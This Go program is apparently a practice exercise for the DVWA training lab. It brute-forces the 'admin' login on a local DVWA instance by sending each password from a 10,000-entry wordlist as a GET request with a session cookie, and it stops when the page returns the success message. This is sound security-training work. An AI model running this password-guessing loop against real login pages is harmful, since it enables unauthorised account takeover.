package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
)

func CrackDVWABruteforcePlayground(username string, phpSessionID string) {
	passwordFilePath := "resource/credentials_top_10k.txt"
	tryingCount := 1

	file, err := os.Open(passwordFilePath)
	if err != nil {
		fmt.Printf("File not found: %v\n", passwordFilePath)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		password := strings.TrimSpace(scanner.Text())
		fmt.Printf("[~] Conducting bruteforcing %d times for user @%s => %s\n", tryingCount, username, password)

		// Prepare and send payload
		url := "http://localhost/vulnerabilities/brute/"
		params := map[string]string{
			"username": username,
			"password": password,
			"Login":    "Login"}
		cookie := map[string]string{
			"security":  "low",
			"PHPSESSID": phpSessionID}

		response, err := sendGetRequest(url, params, cookie)
		tryingCount++
		if err != nil {
			fmt.Printf("[X] Request failed with error: %v\n", err)
			return
		}

		// Check if the request was successful (status code 200)
		if response.StatusCode == http.StatusOK {

			// Extracting response.text (equivalent in request package in Python)
			responseBodyBytes, err := io.ReadAll(response.Body)
			if err != nil {
				log.Fatal(err)
			}

			responseBodyString := string(responseBodyBytes) // stringify response.body.bytes => response.body.text
			if strings.Contains(responseBodyString, "Welcome to the password protected") {
				fmt.Printf("[!] Found an exact password for user @%s => \"%s\"\n", username, password)
				break
			}
		} else {
			fmt.Printf("[X] Request failed with status code: %d\n", response.StatusCode)
			return
		}
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(fmt.Sprintf("An error occurred while reading the file: %v\n", err))
		return
	}
}

func sendGetRequest(url string, parameters map[string]string, cookies map[string]string) (*http.Response, error) {
	client := &http.Client{}

	// Prepare URL with query parameters
	request, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}

	// Set the parameters (GET argv)
	requestURLQuery := request.URL.Query()
	for key, value := range parameters {
		requestURLQuery.Add(key, value)
	}
	request.URL.RawQuery = requestURLQuery.Encode()

	// Set cookies
	for key, value := range cookies {
		request.AddCookie(&http.Cookie{Name: key, Value: value})
	}

	// Send the request
	return client.Do(request)
}

func main() {
	// Prepare two parameters
	// - ID(string) of the account that you targeted
	// - PHPSESSID(string) of your local DVWA account
	CrackDVWABruteforcePlayground("admin", "t8g6kc743kqs4t0e05srgion46")
}
